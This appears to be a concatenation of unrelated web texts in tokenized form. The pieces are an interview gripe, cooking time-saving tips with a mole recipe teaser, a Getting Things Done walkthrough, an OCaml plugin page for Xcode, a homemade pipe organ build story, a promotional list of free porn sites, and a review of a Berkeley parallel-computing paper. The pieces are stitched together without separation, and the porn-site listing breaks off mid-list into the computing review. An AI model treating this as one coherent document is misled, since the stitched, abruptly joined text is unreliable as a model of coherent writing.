I know lots and lots of interviewers , at many companies , who ’ve decided that they can fully evaluate you based on whether you can solve some particular convex optimization problem ( or graph - search problem , or logic problem , or whatever their pet Elephant Question is ) , and they ask every candidate this question regardless of their background or experience .
In fact , I ’d estimate that some 10 % of all technical interviewers ask the same questions , year after year , and they could care less about your experience .

We have a lot of friends who do n’t really cook , but want to .
The most common excuse we hear is that it takes too much time .
Probably the second most common complaint has to do with all the setup costs you incur trying to set up a functioning kitchen .
Both of these are reasonable stumbling blocks to adopting the healthy habit of doing most of your cooking yourself .
We ’ll tackle the “ time it takes ” issue in this post and then tackle the “ setup costs ” problem in a later post .
So how can I cook but have it take less time ?
Here are seven practical specifics that will help make you an efficient cooking machine :
If McDonalds can spend millions doing time - and - motion studies to extract as much efficiency as they can out of their employees , you can at least invest a little time in accelerating your speed at prep work .
Usually the most time - consuming part of preparing most recipes ( especially healthy ones with fresh ingredients ) is the washing , cutting , chopping , slicing , dicing , etc of the produce .
So think of ways you can do it faster .
Part of that is just practice :
Do you remember the first time you picked up a knife to slice an onion ?
I remember … I was n’t even sure which hand I should pick up the knife with at first ( of course that ’s a long and unrelated story which has to do with my left - handedness more than anything else ) .
But now I can reduce an onion to tiny bits in less than a minute and it ’s a relaxing , almost zen - like , task for me .
Be patient , keep at it , and you ’ll get good at this aspect of cooking .
But are there ways you can speed up the actual processing of the prep ?
Can you slice up five carrots piled up all at once rather than painstakingly slicing each carrot one at a time ?
Will it really change a recipe if you “ coarsely ” chop up the onions or the tomatoes rather than “ finely ” chop them ?
Are your knives as sharp as possible so you can blast through your veggies rather than having to saw at them ?
Can you adopt some of the techniques you see in those old Ginsu Knife infomercials where they chop really rapidly and hack up a batch of scallions in seconds ?
( Please watch your fingers though… ) .
Any of these steps could dramatically reduce the aggregate time it takes to cook a meal .
I ’ll have another post tangentially on this subject called “ How to Put Your Spouse to Work In the Kitchen ” :) but for now think of ways you can get somebody ELSE to do some or all of your prep work for you while you manage the recipe like a general contractor .
Can you have one of your kids sit at a separate table or work at a different section of the counter and peel and chop carrots , or wash and rinse veggies ?
This can save an immense amount of collective time and it ’s actually good quality time for a family .
Note :
An extreme example of “ outsourcing ” prep work is to buy pre-cut veggies in a plastic bag in the store , or minced garlic in a can .
Do n’t let me hear about it if you do this .
There is such a thing as taking an idea too far .
Pre -cut veggies are likely going to be tasteless and probably sprayed with disinfectants that you ca n’t easily wash off .
Better to buy whole produce and wash yourself .
And using pre-minced garlic is cheating in my opinion .
This is also something that comes with practice , but you ’ll get much more intuitive at it after you ’ve cooked the same recipe a few times .
When you look at a recipe , can you find examples where you can do two things at once to save time ?
For example , if you are making a dish with pasta can you bring the pot of water to a boil on the stove while you do 15 minutes of other prep work ?
That one may seem like a sort of obvious example , but this was a surprise timesaver to my wife when she was learning to cook .
Note also that if you can “ outsource ” prep work while you do other tasks , you are performing a great example of parallel processing too .
If you ’ve ever made a double batch of anything , you ’ll find an amazing phenomenon happen :
For most dishes when you double them , it does NOT take 2 x the work to make 2 x the food .
Instead , I ’ve found the ratio to be more like 2 x the food for something like 1.2 x the work !
That ’s a huge incremental benefit in terms of work per unit of food cooked .
Try and find recipes that can be doubled ( or even tripled ) easily so that you can capitalize on this scale benefit .
There is one problem to watch for with this technique : you make a huge batch of something and you end up having to eat it every day for a week .
By the end of the week you are so sick of the dish that you never want to see it ever again ( believe me , I ’m speaking from direct experience here ) .
There are a few solutions to this .
One is to freeze half of the dish and save it for another week .
Another solution is to cook double batches of TWO dishes and alternate them every other day , or even alternate each meal for lunches and dinners .
This is a corollary to the “ scale your meals up ” suggestion and it saves my wife and me several hours of cooking time every week .
We both work long hours and I have a long commute to work on top of my long hours .
So we hit upon the idea of doing most of our cooking on the weekends and then using the leftovers for our meals during the week .
Any meal that we thought we ’d like to cook on a Saturday or a Sunday we would make extra and freeze or refrigerate whatever was left .
Once in a while we might have to cook something on a Thursday night or limp into the weekend with a Friday night pizza delivery , but in general this system works really well for us .
Heck , neither of us wants to get home late after a crappy day at the office and THEN have to fire up a meal from scratch .
Seems obvious , right ?
But what makes a recipe “ easy ” and how can you tell just by looking at it ?
This is a more complicated subject than it looks ; in fact look for an entire post on just this subject in the near future .
But for the time being I ’ll just give a few quick pointers :
Look for easy - to - find ingredients , recipes with only a few steps ( and nothing intricate ) , and recipes that do n’t contain an insane amount of chopping or prep work .
For now , as you try new recipes and roll through your various cooking experiences , just keep your eyes open for any dishes that you ’ve tried that came out well AND were quick and easy for you to make .
Those recipes should be clear candidates for “ heavy rotation ” as we ’ll see next …
Hey , if radio stations do it , you can do it too .
Build a short list of your cooking “ hits ” -- recipes that are both popular with your family and that you can make quickly and easily .
Then regularly rotate one or more of these hit recipes into your weekly menu .
The key here : if you make the dish regularly you ’ll get faster and more efficient at it until you can practically do it blindfolded .
Obviously , just like radio , you ca n’t milk this strategy too heavily or you ’ll get sick of ALL your hit recipes .
The recipe below , my Chicken Mole , is a classic in our household and often finds itself “ in the rotation ” .
It ’s easy and quick , yet pretty original and unusual .
Since I ’ve made it a zillion times , I can make it from start to finish faster than my rice cooker can fire up a batch of rice to go under it .
I ’ve found that if you have a short list of five or six truly easy - to - make “ hits ” and rotate one of them into your menu each week , you can use this system indefinitely without getting sick of any of the hit recipes .
Believe me , that ’s a far cry from a typical radio station that plays the same song every three hours !
Moreover , you will find that you get quicker and quicker in finding the ingredients in the store , keeping them handy at home , and preparing and scaling up the meal itself .
If you double the batch size of your heavy rotation recipes , you can efficiently take care of 1/ 3 or more of your meals this way , depending on the size and appetite of your family .******************************** You ’ll find two essential concepts that underlie these seven suggestions : that you must “ practice ” and “ iterate ” when you cook .
You might find this somewhat frustrating , especially if you thought you could become a Ginsu master after just reading one lousy blog post !
But as with anything in life , if something is worth doing , it ’s worth doing well .
You may be slow at first , but with surprisingly little practice and experience you will learn lots of shortcuts and techniques that will make you a faster and faster cook .
This notion of practicing and iterating pretty much underlies everything I do when I cook .
I ’m always looking for ways to improve my cooking , and at this stage of my life and career , one of the key ways I needed to improve was to get faster and more efficient in the kitchen .
But keep in mind that cooking should n’t be just about speed .
There are inherent rewards to knowing enough about cooking and eating such that you ’ll appreciate the process of creating and enjoying a great meal .
If you fundamentally hate cooking , will never enjoy the process of cooking , and you are permanently convinced you will never change your crappy attitude about cooking , then nuts to you .
I ca n’t help you .
Go read someone else ’s blog .************************
Try one of our household ’s favorite “ heavy rotation ” dish : Chicken Mole ( pronounced MOH - lay ) .
It is easily scaleable ( I ’ve cooked it for 27 people at a family reunion ) , freezable and reheatable .
Enjoy !

Taking control of your finances is easier when the rest of your life is in order .
If your mind is swamped with worries about work , or home improvement projects , or obligations to friends and family , personal finance can become a low priority .
You have other Stuff to worry about .
David Allen 's Getting Things
Done provides a system for tackling all of the Stuff in your life .
I 've avoided mentioning Getting Things Done before today .
But I 'm currently writing a couple of articles that will make more sense if you 're familiar the concept , so an introduction is in order .
Introduction
Getting Things Done ( GTD ) is about productivity .
Its aim is to help you do more while feeling less stressed .
Rather than explain the system — other sites have done so already — I want to share how I implemented it in my own life .
Since I did n't follow things to the letter , and since many of you are probably unfamiliar with GTD , I 'll begin with a brief description .
The following has been simplified .
How ‘ Getting Things Done ' Works
Our lives , says Allen , are filled with too much Stuff : we think about Stuff , we worry about Stuff , we never get all the Stuff done that we need to do .
His solution is to gather all of the Stuff into a single Collection Bucket .
When all the Stuff is in one place , the top item in the Bucket is processed .
When the first item has been processed , the second item is processed .
Everything in the Collection Bucket is processed — one item at a time — until there 's nothing left .
Whenever an item is taken from the Collection Bucket , ask yourself : “ Is this actionable ? ”
In other words , “ Is this something that I can take care of right now ? ”
If the item is not actionable :
toss it in the trash ,
file it for future reference , or
place it in a regularly - reviewed tickler file for possible future action .
If the item is actionable :
do it , if it will only take a few minutes ,
delegate it , if it 's somebody else 's responsibility , or
defer it .
Using this system , most items are processed immediately .
Some items are deferred .
Deferred items may be :
placed on a calendar if they must be done at a specific date and / or time , or
put on list of Next Actions if they 're things that need to be done ASAP .
There 's a special subset of actionable items called Projects .
These are multi-step tasks .
Each Project gets its own file , and the Next Action for each Project is placed in the Collection Bucket .
After the GTD has been implemented , the Collection Bucket should be emptied once a week ( or as often as necessary ) .
That 's it .
That 's the system .
Here 's a graphical representation :
Scott Moehring , a former ( unofficial ) GTD coach , created an outstanding advanced workflow diagram [ PDF , 321k ] .
I have this hanging above my desk as a constant reminder .
Moehring has graciously granted me permission to offer this as a free download .
Adapting the System for Personal Use
One of my mantras is “ Do what works for you ” .
The Getting Things Done system is presented primarily as a tool for business use , but it 's easily applied to one 's personal life .
They key is to modify it so that so that it fits the way you live and work .
Here 's how I got things done :
Preparation
I made a trip to an office supply store to pick up : file folders ,
an automatic labeler ,
four 12 × 12 tiles of cork ,
a nice wooden inbox ,
thumbtacks ,
scotch tape , and
a few other items .
( If you 're feeling frugal , you can do without this stuff .
Allen says that ideally you would buy the best quality components you could afford — if your tools are a pleasure to use , you 're more likely to use them . )
Collecting Stuff
I gathered together all of my Stuff , both physical and mental , and piled it on the kitchen table .
To gather the physical Stuff , I walked from room - to - room with a box , into which I stacked all the Stuff I could find ( e.g. magazines , photographs , junk mail , to - do lists , letters , etc. ) .
To gather the mental Stuff , I walked from room - to - room with a stack of index cards , onto which I wrote all the Stuff that occurred to me ( e.g. put away clothes , clean cat food area , hang painting on guest room wall , organize DVDs , prune laurel from back porch , etc. ) .
Sorting Stuff
Collecting all my Stuff in one spot took several hours .
Next , I began to process it .
Mostly this was easy .
I just started with what was in front of me , picked it up , and asked myself what the item was and what needed to be done with it .
If it was something I could deal with in just a few minutes , I dealt with it .
( For example : books that needed to be shelved . )
. )
If it was something that needed to be dealt with soon , but that would take longer than just a few minutes , I set it aside in a Next Actions pile .
( For example : canceling cell phone . )
. )
If I no longer needed the item , I threw it out .
( For example : house flyers . )
If it was something that I wanted to keep for Reference , I made a new file folder ( labeling it with my handy automatic labeler ) .
( For example : all of the various songlists I jot down for future CD mixes . )
. )
If it was something for somebody else , I put it in a Delegated pile .
( For example : anything related to the bathroom remodel , which Kris was in charge of . )
. )
If it was a part of a larger Project , I stuck it in a folder marked Projects .
( For example : organizing all of my writing , from high school til today . )
. )
If it was something that needed done on a specific date , I entered it into iCal .
( For example : my upcoming dentist appointment . )
. )
If it was something that did n't need done right away , I stuck it in a Tickler file to process later .
( For example : scheduling a poetry night . )
. )
If it was something that was just an idea , something that I might want to do someday , but it wo n't kill me if I do n't , then I put it in a file marked “ someday / maybe ” .
( For example : buy a nice leather easy chair . )
The sorting process took an entire day .
When the kitchen table was clean once more , I had several file folders filled with to - do lists .
I also had a stack of Next Actions .
Organizing Stuff
I tucked my reference file folders ( and there were several dozen of them ) into a desk drawer .
I put the Projects file into my inbox ( because I needed to break it down later , creating individual files for each project ) .
Most of my organization , though , involved the stack of action items : I hung the aforementioned cork tiles on the wall next to my desk .
I labeled the top corkboard “ Next Actions ” .
For each action item , I created an index card .
( Actually , I used some old business cards — they 're the perfect size . )
I tacked the index cards to the cork in no particular order .
After two - and - a - half days , I was finished .
My version of the Getting Things Done system was set up and ready to use .
Doing Stuff
When using the canonical GTD system , you process the Next Action , no matter what it is .
For my purposes , I made an exception .
I cherry - picked .
I selected a few cards at a time , and then I did whatever they said : clean car , buy mini - to - mini cable , check hoses on washing machine .
If the action was something that I know comes up repeatedly ( clean car , for example ) , then I tucked it in a drawer for later use .
After my initial Brain Dump , I had 53 Next Actions .
I did eleven of them the first day .
I did six more then next .
The rest I tackled over the following weeks .
Ready for Anything
You know that freedom you feel when your on vacation ?
That wonderful sense that there 's nothing to worry about ?
That 's what this system attempts to give you .
When I exercise the discipline to get things done , I 'm happier .
Things seem to fall into place .
Some of you probably believe this is silly .
It probably seems like a lot of effort to take care of something that you can do in your head .
The point , though , is that this system gets everything out of your head .
When you 're trying to juggle 53 Next Actions in your head ( along with a dozen Projects , a dozen someday / maybe wishes , a score of calendar items , and a bunch of other ideas ) , it can be overwhelming .
It 's easy to feel stressed , or bewildered , or desperate .
With the Getting Things Done system , everything is out of your head and on paper .
You do n't have to think about things anymore .
You just do them .
Conclusion
Getting Things
Done offers a solution for creating order out of chaos .
Unfortunately , I tend to lose focus on the system with time .
Things happen , and I forget to process my inbox for several weeks , and then it becomes intimidating .
Weeks turn to months .
Eventually the chaos returns .
When this happens , I perform a system reset .
I start over from scratch .
But even the experts have trouble sticking to the system .
Scott Moehring — who shared the advanced workflow diagram posted above — told me :
I go on and off with GTD , but it is always part of what I do .
I am always happier when I follow it . [… ]
I collect almost everything , but it falls off in varying degrees from there .
My worst part is the Weekly Review , and I think it is the most critical part .
Two things really help me , though : keep it as simple as possible , and manage your e-mail this way .
I 'm sure you can imagine the ways in which GTD concepts can be extended to your financial life .
In the future , I hope to share some of the ways I 've combined the two .

Objective Caml Plugin for Xcode
Last version : beta 10 .
Download it
News
January , 4th - port to Xcode 3 ( beta 10 )
Table of Contents
Objective - Caml is a programming langage created by the INRIA , a french research center in computer science .
For more informations , go to the Objective Caml web site .
Extract from this site :
Objective Caml is the most popular variant of the Caml language .
From a language standpoint , it extends the core Caml language with a fully - fledged object - oriented layer , as well as a powerful module system , all connected by a sound , polymorphic type system featuring type inference .
The Objective Caml system is an industrial - strength implementation of this language , featuring a high - performance native - code compiler ( ocamlopt ) for 9 processor architectures ( IA32 , PowerPC , AMD64 , Alpha , Sparc , Mips , IA64 , HPPA , StrongArm ) , as well as a bytecode compiler ( ocamlc ) and an interactive read - eval - print loop ( ocaml ) for quick development and portability .
The Objective Caml distribution includes a comprehensive standard library , a replay debugger ( ocamldebug ) , lexer ( ocamllex ) and parser ( ocamlyacc ) generators , a pre-processor pretty - printer ( camlp4 ) and a documentation generator ( ocamldoc ) .
The official Objective - Caml compiler and runtime release only includes command line version of the developer tools .
So , you need to use makefiles to deal with more - than - one - file projects .
Makefiles are powerful , but a bit complex to use .
Even if you may use makefiles in Xcode , it 's more practical to have a full integration into Xcode .
This Xcode plugin allow you to :
create a Objective Caml projet or target with Xcode
add files to this target like you do for a C program
modify the OCaml compiler or linker settings through the Xcode 's build - in build setting GUI .
adding a library in library build phase of a OCaml target
syntax higlighting
use ocamllex and ocamlyacc
use of the native compiler ( select architecture " ppc " instead of the default " ocaml " )
dependance between source files
mixing OCaml and C code
However , as it's a beta version , it does n't support yet :
better dependance between source files ( you must put them manually in the good order in the target build phase )
targeting the intel procs ( only bytecode & ppc support at this time )
ocamlp4 preprocessor
debugging from Xcode ( but possible with direct use of ocamldebug )
Groups & Files Errors & warnings , syntax coloration Compiler build Settings Linker build Settings OCaml targets
Requirement :
Xcode 3.0 ( which itself only runs on Mac OS X 10.5.x ) .
Objective Caml development tools 3.08.3 or later installed in /usr / local / bin ( unofficial packaged version here , official installer here ) .
To install the plugin , you have to put the following files in your Library folder or in the system Library folder :
To install previous version of the plugin working with xcode 2.3/4/5 , available here , you have to put the following files in your Library folder or in the system Library folder : OCamlPlugin.pbplugin in :
Library / Application Support / Apple / Developer Tools / Plug-ins /
in : Target templates in :
Library / Application Support / Apple / Developer Tools / Target Templates / OCaml /
Project templates in :
Library / Application Support / Apple / Developer Tools / Project Templates / OCaml /
If your ocaml tools are not installed in /usr / local / bin , you may set up the installation base path with the following command ( it 's a per- user setting ) :
# ocaml installed with fink : defaults write com.apple .
Xcode INOCamlBasePath /sw # ocaml installed with darwinports defaults write com.apple .
Xcode INOCamlBasePath / opt/local

The story of my home made pipe organ
Playing with ( not on ) my organ
Not so early beginnings
It all began in the fall of 1992 , in my final year of university .
For lack of a better arts elective to take , I decided to take Music 111 .
I had absolutely no background in music at the time , and sometimes even had trouble telling whether two consecutive notes were ascending or descending .
Nevertheless , I bravely decided to take the course .
As the course progressed , I discovered that some of this stuff was actually logical , and also kind of fun .
I found myself using the piano room just to play around .
I never cared much for attempting to play sheet music , but the idea of hitting keys and getting a sound that was sometimes harmonious was strangely appealing .
With my nonexistent music abilities , and my limited budget , I could n't justify buying myself a little Casio synthesizer or something like that .
The only way I could justify owning a musical instrument was if I actually built it .
I am very fortunate that my dad has a very large and wonderful woodworking shop .
When I went home for Christmas that year , I started experimenting with organ pipes .
That Christmas was particularly busy for me , as I also built two tables , because the house I was renting with friends was a little bit under - furnished .
Experiments and design
My first organ experiments were high in volume , if not in harmony .
I proceeded to build two wooden pipes , and mounted these on top of a box with a vacuum cleaner motor inside
My first organ pipe experiment From these experiments , a few things became apparent :
A vacuum cleaner motor is WAY too noisy A vacuum cleaner motor produces more than enough pressure High air pressures can cause pipes to play anything but their fundamental
My basic pipe design was quite capable of making noise Everybody in my family teased me about even considering building an organ , and to tell the truth , I was n't so sure at that point either .
I did experiment with slowing down the vacuum cleaner motor ( the black cylindrical thing to the left of the box is a 1 kilowatt Variac ) , which helped , but I left it for the time being .
I proceeded to build the two tables I had intended to build over the holidays , and then to experiment further .
I knew I could build pipes to play just about any reasonable pitch I wanted to , as long as I did not apply too much air pressure .
My next set of experiments revolved around coming up with a simple ' valve box ' design that I could build .
At the time , I did n't know such a thing in organ terminology is called a ' wind chest ' .
Another catch was that I did not have a good supply of leather for the ' gaskets ' in the valves , so the design I came up with did not use any gaskets .
Overall windchest design and dimensions
This drawing shows the cross section of the wind chest design I ended up using .
The drawings came much later though .
All dimensions are in millimeters .
The letter labeled components are as follows : A White key B Black key C Felt for white key bottom stop D
Felt for black key bottom stop E Metal bracket to support shaft every 12 keys F 1/4 " steel shaft for key ' hinge ' G
Top stop for keys ( only gets hit if are let ' snap ' up '
H Nail in back of keys , with steel wire twisted on J Steel wire K Small opening with felt padding to pass wire into pressurized wind chest L Removable portion of wind chest lid M Steel spring to hold down valve block N Valve block .
Valve block seals against wind chest bottom O Wind chest bottom P Plastic hoses leading to pipes
The valve blocks are all sanded smooth , and so is the bottom of the wind chest .
The leaf springs apply pressure exactly over the center of the hole below , thus causing for a tight seal of the two flat surfaces .
The valve blocks are rounded slightly towards the back .
This gives for a more gradual opening , and quieter operation ( at least that 's my theory ) .
Wind chest cross section with key pressed
As I chose not to have a complicated linkage between the keys and their corresponding valves , it was necessary to have the valves at the same overall spacing as the keys .
I accomplished this by breaking the valves into two rows of whole - tone scales .
The pipes themselves are of course much wider , so I used plastic tubing to connect the valves to their corresponding pipes .
Valve block details
A Hole for back alignment pin ( nail ) B Block for end of leaf spring to push down C Pin for attaching steel wire to actuate valve D Slight bevel at front to ensure good contact on main area E Slight bevel on back for valve to ' roll ' back on .
Causes more gradual opening F
Flat main area to seal against wind chest bottom G Block to clamp two metal springs H Valve block in place over opening J Valve block back alignment pin K Valve block front alignment pin L Hole in bottom of windchest with plastic tubing
The original experimental pipes I built were of a difficult design to execute , as the front of the pipe was actually sandwiched between the two sides .
This was good for initial experiments , especially when testing the pipes for different configurations before I glued them , but not for making large numbers of them .
The next pipe design I came up with is much easier to build : Pipe Design
A Top of pipe .
One piece B Block to form air gap for air to come put C Small wooden insert to adjust opening of the mouth ( voicing ) D Block at top of organ , cut out for air passage from hose to slot .
E Small wooden block for tuning pitch down if I cut the pipe too short
This design does have a major weakness in that the block ' B ' must be precisely fit into the slot .
If it is too narrow , air escapes from the side .
Construction Using this design , I built about 3 octaves worth of pipes .
I varied the geometry as I scaled the pipes , so that long pipes were more slender with respect to their length than the short ones .
This produced a louder sound in the higher octaves .
I also found out that pipes that are long and slender are much easier to tune , and keep their pitch much better across a wider range of operating pressures and surrounding geometries .
I did run out of time that Christmas holiday , but the result was already playable .
I did n't obtain a better air pump than the vacuum cleaner motor .
So what I did is put the vacuum cleaner motor into a box , which was surrounded by foam , which was contained in a box of 2 " hardwood , which I surrounded by foam , which I put into a cardboard box .
With the vacuum cleaner running at about 40 volts to get the right pressure , the noise was tolerable .
I took what I had with me back to University , and set it up in the living room of the house where I lived .
Even though we had a modular MOOG and a Jupiter 6 synthesizer set up in our ' studio ' , my house mate Keith and I ended up playing with that organ an awful lot .
4 months later I had to re-varnish the keyboard .
We had worn four layers of varnish straight off the keys !
View into the windchest , with one valve block removed
The valve blocks are pulled by the steel wires , which are simply twisted onto a nail sticking out of the back of each key .
This is primitive , but works quite well .
Being able to adjust the length of the wire by twisting it slightly is important , as it determines how far down the keys are when not pushed .
If the keys are not level it looks really dumb .
Also , note the yellow spacers between the keys .
These are to keep the keys from rubbing against each other directly , and also reduce friction .
In the winter , I always need to add some spacers to get the keyboard to feel ' tight ' , while in the summer , I have to remove them .
This is all caused by wood shrinkage and expansion from changes in humidity .
The pipe organ , as set up in early 1993 I had n't had time to build a stand , so all the pipes were just stacked under the keyboard unit in that first setup .
Some were dangling from their plastic hoses , some stacked with wooden blocks between them .
This was a terribly precarious arrangement .
Every time the stack of pipes was bumped , they shifted slightly , and would alter their tuning .
The sound of these pipes is very sensitive to their immediate surroundings , I discovered .
End view of the loosely stacked pipes .
I spent a lot of the next 4 months fine tuning some of the pipes , as well as adding felt under the keys to dampen the noise they made when they hit bottom .
Tuning the pipes without having convenient access to a woodworking shop was also more difficult .
They way I had originally tuned them was to tune my Commodore 64 to the pitch the pipe was playing , then work out the frequency I had tuned the computer to , calculate the corresponding reduction in length of the pipe , marked it on the pipe , and then took it to the shop to cut the pipe off on a band saw .
This worked for tuning up .
For tuning down , I could place a small block of wood in the end of the pipe to reduce the pitch .
For minor increases in pitch , I also ended up flaring the end of the pipe with a knife .
I also ended up finally replacing the vacuum cleaner motor with something more elegant .
It turns out that running at about 40 volts for extended periods was not good for the vacuum cleaner motor .
Carbon deposited between the copper contacts on the commutator , and then conducted electricity and started to smolder .
My theory was that the motor 's design intended for centrifugal force to clear the carbon dust from the commutator , but at the low speeds at which I was running it , this did n't happen .
The organ pump and motor
After the vacuum cleaner motor died , I was very lucky to find a 1/12 'th Hp motor and precision blower at Princes Auto ( A surplus store ) , for a grand total of $ 20 .
I used a scrounged O-ring as a belt , and adapted the paper feed pulley from an old teletype by sanding an indentation into it for the O-ring to run in .
The pulley on the blower also needed modifications , so I removed the shaft and cut a groove for the O -ring into it on a metal lathe in the student machine shop at the University .
This combination I placed in the box I had built of 2 " planks .
The combination was so quiet that its noise became a total non-issue .
At about the same time the real vacuum cleaner we were using in the house died , and I was able to reuse the bearings from that motor to fix our actual vacuum cleaner .
The organ in the ' studio ' we had set up
We had quite the studio setup at the time .
Bottom right is the pipe organ , behind it the Jupiter 6 .
To the left is the modular MOOG synthesizer ( two VCO 's 1 VCF , 2 envelope generators ) .
In the back is one of our reel to reel tape decks , the drum machine , and a DSP sound processor box .
Also note the knife set on the cardboard box in front .
I used the knife set for tweaking the wooden pipes , and the cardboard box it is resting on has the vacuum motor blower in it ( for extra insulation )
If you are wondering , the box in the back IS a box for a lava lamp .
Finishing up the organ Gluing the 4 ft C , D , and D# pipes Later that year , after graduating from University , I spent another week in my dad 's shop and finished it up .
I had previously not fully ' populated ' all the possible notes of the keyboard .
I rebuilt the uppermost half octave to change the aspect ratio , and extended the range by half an octave at the top , and three notes at the bottom .
Before this , the organ 's bottom octave , and top half octave keys only made an air escaping type of noise when they were pressed .
Pressure regulator , with rocks to control pressure and foot pedal I also built a pressure regulator for the organ .
This regulator consists of a simple bellow , about 20 cm x 20 cm , but with only 3 cm of travel .
This bellow was not so much intended for a reservoir , but more as a pressure sensor .
When the bellow falls , the valve at the bottom of the bellow opens further to let more air from the blower in , thus maintaining the pressure .
The pressure can be varied by piling various amounts of rocks on top of the bellow , as well as by a special foot pedal which can be used to apply extra pressure to the bellow for ' expression ' .
Bellows opened up I took some photos of the regulator disassembled .
The left shot is the valve at the bottom of the regulator .
When the wire at left is pulled up , the assembly pivots to the right on the shaft , and closes off the air inlet on the bottom of the bellow .
The wire is attached to the bellow .
When the bellow has enough pressure in it , it lifts up the rocks piled on it , and also pulls up on the whire , which closes the valve .
Keyboard and upper two octaves
This picture shows the organ with the top flipped up .
This is not optimal for playing however , as the organ , because I tuned it with the lid down .
Organ pipes are very sensitive to the shape of their immediate surroundings .
This is how the organ is set up in my living room today .
I only play with it occasionally , and only when I am certain that I 'm alone .
Every once in a while , I have a visitor who is musically talented , so the organ does get some use .
It 's also a great conversational piece !
More pictures of the organ and its construction I contemplated building a better organ with multiple registers .
I got as far as making a few drawings on the computer , but then abandoned it .
Here 's a few pictures of my preliminary plans for organ 2 .

Free porn & torrent site articles and news – Zenofeller
What are the best websites to find full length Porn Movies
Now we ’re all familiar with shorter , small - run free porn clips you can find at sites like , pornhub or redtube .
However , these are n’t where all the porn production goes on , after all who would waste a day ’s worth of filming on a 15 min porn scene ?
Where these scenes come together , usually weaved together with a story is in a full fledged porn movie you can watch online , now you may be wondering where do you WATCH these porn movies ?
Well worry no longer , for we ’re bringing the best websites to find full length porn movies straight to you !
Pornhub
Do we really need to say anything here ?
It ’s Pornhub , there are few words that explain the absolute dominance of this site when it comes to free porn , so it is to no surprise that it is one of the top candidates on this list as well .
We ’ve all been on Pornhub , we ’ve all enjoyed our visits , and while it can sometimes feel a bit same -y , the same way we ’ve all watched it , we ’ve all gotten used to it .
Despite this , it remains to be one of the foremost providers of this content , so if you ’re looking for a full - fledged porno flick this is the site for you most of the time .
Redtube
One of the eternal number two-s , Redtube manages to keep a somewhat lower profile than its competitors , and it excels in smaller productions , the red design of the site is also extremely pleasing to the eye .
If you ’re looking for a fairly niche porno that you are n’t sure if it ’s from a big production , this site is probably your best bet , as they ’ve got a massive library of flicks like those , made by low budget studios .
Anyone who cares at all about taking advantage of these nasty new microprocessors that still follow Moore ’s law but sideways not just straight up ought to go and read The Landscape of Parallel Computing Research : A View from Berkeley .
As the title suggests , it ’s an overview paper .
Thank goodness we have universities , so that smart people who know about this stuff can invest a few months in surveying the landscape and report back for the rest of us who are being whipped around by the market maelstrom .
Herewith way too much applause and disagreement and expansion .
[ First off , thanks to Liang Chen ; I ’d been meaning to get around to looking at this for a while , and he slapped a printed copy down in front of me , which got me started . ]
Logistics ·
This is a big , thick , dense paper ; I had to read it in fits and starts while doing lots of other things and I lost track , but I bet it added up to a couple of hours .
Also , there ’s a supporting wiki and a blog , although I ’m not clear whether the paper represents the conclusion of the wiki process , or whether the material in the wiki reflects further thought .
Crunchy Research Goodness ·
Maybe the best thing here for me is that the survey covers a bunch of research that I ’d missed .
I ’m sure lots of my readers knew the following , but I did n’t :
Internal system bandwidth is increasing much faster than latency , they say “ at least the square of the improvement in latency ” .
Cisco has been drawing a lot of attention with their Metro chip : 188 small cores based on 130nm technologies .
There are some neat calculations from Amdahl ’s law to suggest that making the cores on your chip non-uniform , as in having one that ’s a lot faster than the rest , can pay off big - time .
As memories get bigger and cheaper and processors get faster , the number of processor cycles to fetch something all the way from mainline RAM gets bigger and bigger .
In a complicated multi-core multi-chip system , message - passing latency between core varies dramatically depending on how “ close ” the cores are to each other .
Hmm , I feel a new acronym coming on : NuML .
In recent research , “ Autotuners ” have been showing excellent results .
It ’s like this : there are a lot of different ways a compiler can go about optimizing the code it generates .
It ’s really tough to make the right choices along many different optimization axes based on your best guess as to how the underlying hardware will behave .
An autotuner explores the optimization space by trying random permutations of lots of different settings while running actual code , and discovers empirically what works best ; you run it once to determine the right compiler settings for a particular machine configuration .
Unsurprisingly , these things can outperform the best guesses of the compiler writers .
Convincing ·
The paper presents a few arguments I had n’t heard before that had me thinking ( without going and plowing through all the supporting research ) : that has to be right .
Finite Automata · State machines have long been my personal single favorite piece of Computer Science .
But the parallelization story is n’t good , not good at all .
Which means they will probably become a little less central to our discipline .
Sob .
Multicore vs. Manycore · I ’d never seen “ manycore ” prior to reading this , perhaps it ’s a term of art in the Computer - Architecture coffee - shops .
By “ multicore ” they mean “ what IBM and AMD and Intel and Sun are doing now ” .
By “ manycore ” they mean , “ way more cores , each simpler , like what the Cisco Metro is doing ” .
They argue that “ manycore ” buys you more of the performance metrics that matter .
Sounds convincing .
But also sounds hard to program .
Performance Counters · Historically , some CPUs have had them , but they ’ve been low - priority features that got triaged out when the designers had their back to the wall .
Which is just silly .
They ’re easy to design , they do n’t slow things down , and in a processor whose design is getting increasingly complex along multiple dimensions , it ’s just not reasonable to ask software designers to live without them .
JIT compilers can use them , big - time .
As the study points out , ideally you ’d like existing programs ( existing binaries , even ) to run faster on complex parallel hardware , and without hard data about where the cycles are going , you ’re pushing a hard problem very near the border of “ impossible ” .
Human Results ·
The full title of the section is Programming model efforts inspired by psychological research , but that ’s a little misleading .
If I understand correctly , what they mean is : Study the effectiveness of different programming models by measuring the results delivered by actual real human programmers who use them .
Well , d’oh .
Anyone who ’s sat in a bar with a bunch of heavy AOP or Lisp wankers will sign up for this one in a flash .
Me , I do know quite a bit about programming models and I know what I like , but I do n’t think I ’m smart enough to predict what ’s going to empower developers to deliver , whether your efficiency metric revolves around programmer time or CPU time .
So let ’s , you know , do the experiments and learn from whatever it is they tell us ?
Yes , controlling for all the variables will be hard .
In fact , there may be some flashes of genius required in pulling together the experimental methodology .
But important science is n’t supposed to be easy .
Unconvincing · Mother always said “ If you ca n’t find anything nice to say , do n’t say anything . ”
But this is Science , so that does n’t apply .
Dwarfs ·
The study supposes that if you could partition the universe of programming problems into a few equivalence classes , then by optimizing your system design for one or more of these classes you could optimize it for the problems that fall into those baskets .
Which sounds plausible .
They call their baskets “ Dwarfs ” because they started with seven of them ( the number grew to thirteen ) .
Personally , I think all these basket - weaving Dwarfs could be subtracted from the study without loss of value .
The majority of them apply to particular sub - disciplines of scientific computing ; for example , the first three are Dense Linear Algebra , Sparse Linear Algebra , and Spectral Methods .
Important stuff for people who do Scientific Computing , which is itself important stuff .
But I do Web computing , which constitutes a not - insignificant proportion of all computing , and when I consider which Dwarfs I ought to care about , well , I ’m not sure .
The wiki is a little more helpful than the paper itself , and my best guess is that I ought to care about Graph Traversal and Finite State Machines .
The first suggests that a lot of this computing depends on random memory access latency , which accords well with my intuitions .
